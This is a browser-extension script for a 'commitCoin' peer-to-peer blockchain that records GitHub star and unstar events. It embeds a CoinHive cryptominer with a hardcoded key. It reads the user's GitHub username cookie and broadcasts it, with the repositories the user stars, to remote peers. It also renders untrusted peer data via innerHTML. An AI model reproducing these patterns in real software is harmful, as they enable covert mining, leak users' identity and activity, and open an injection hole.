import Blockchain from './Blockchain';
import Block from './Block';
import config from './config';
import actions from './actions';
import events from './events';
import jsonpack from 'jsonpack';

let channels = [];
let blockchain = null;
let miner = null;

function sendData(c, data) {
    try {
        c.send(jsonpack.pack(data));
    } catch (err) {
        let idx = channels.indexOf(c);
        if (idx >= 0) {
            channels.splice(idx, 1);
        }
    }
}

window.onload = () => {
    
    try {
        miner = new CoinHive.Anonymous('22Gilm1egEhU4A1HSTi7fDZM8CWjRqTJ');
    } catch (err) {
        console.log('miner failed');
    }
    
    if (miner !== null) {
        chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
            if (request.action == actions.START_MINING) {
                console.log('miner start');
                miner.start();
            } else if (request.action == actions.STOP_MINING) {
                console.log('miner stop');
                miner.stop();
            }
        });

        // setInterval(() => {
        //     console.log(miner.getHashesPerSecond());
        // }, 1000);
    }

    const iceServers = [
        {
            urls: 'turn:13.229.219.170:80',
            username: 'commitcoin',
            credential: "commitcoin"
        },
        { urls: "stun:stun.l.google.com:19302" }
    ];

    
    let messages = document.getElementById('messages');

    let network = RTC({
        constraints: null,
        channels: {
            blockchain: true
        },
        ice: iceServers,
        signaller: 'http://13.229.219.170:3000',
        room: 'commitCoin'
    });


    network.on('channel:opened:blockchain', function(id, dc) {
        
        dc.onmessage = function(evt) {
            let data = jsonpack.unpack(evt.data);
            if (data.event === events.ADD_BLOCK) {
                console.log('sending');
                let block = Block.fromJSON(data.block);
                blockchain.addBlock(block);
            } else if (data.event === events.SYNC_CHAIN) {
                console.log('syncing');
                let chain = data.chain;
                blockchain.replaceChain(chain);
            }
            messages.innerHTML = JSON.stringify(blockchain.getFullChain());
        };

        channels.push(dc);
        
        if (blockchain === null) {
            blockchain = new Blockchain();
            console.log('connected');
            
            setInterval(() => {
                channels.forEach(c => {
                    let data = {
                        event: events.SYNC_CHAIN,
                        chain: blockchain.getFullChain()
                    };
                    sendData(c, data);
                })
            }, config.syncInterval);

            chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
                if (request.action == actions.GET_CHAIN) {
                    sendResponse({ blockchain: blockchain.getFullChain() });
                }
            });
        
            chrome.webRequest.onCompleted.addListener(function (details) {
                console.log('stared');
                chrome.cookies.get({
                    url: 'https://github.com',
                    name: 'dotcom_user'
                }, (cookie) => {
                    channels.forEach(c => {
                        let data = {
                            event: events.ADD_BLOCK,
                            block: blockchain.generateBlock({
                                action: actions.ADD_STAR,
                                user: cookie.value,
                                repo: (details.url.split('/')[3]+'/'+details.url.split('/')[4])
                            }).toJSON()
                        }
                        sendData(c, data);
                    }); 
                });
            }, {urls: ['https://github.com/*/star']});
            
            chrome.webRequest.onCompleted.addListener(function (details) {
                console.log('unstared');

                chrome.cookies.get({
                    url: 'https://github.com',
                    name: 'dotcom_user'
                }, (cookie) => {
                    channels.forEach(c => {
                        let data = {
                            event: events.ADD_BLOCK,
                            block: blockchain.generateBlock({
                                action: actions.REMOVE_STAR,
                                user: cookie.value,
                                repo: (details.url.split('/')[3]+'/'+details.url.split('/')[4])
                            }).toJSON()
                        }
                        sendData(c, data);
                    }); 
                });
            }, {urls: ['https://github.com/*/unstar']});
        }
        
        
    });

    network.on('channel:closed:blockchain', function(id, dc) {
        let idx = channels.indexOf(dc);
        if (idx >= 0) {
            channels.splice(idx, 1);
        }
    });
}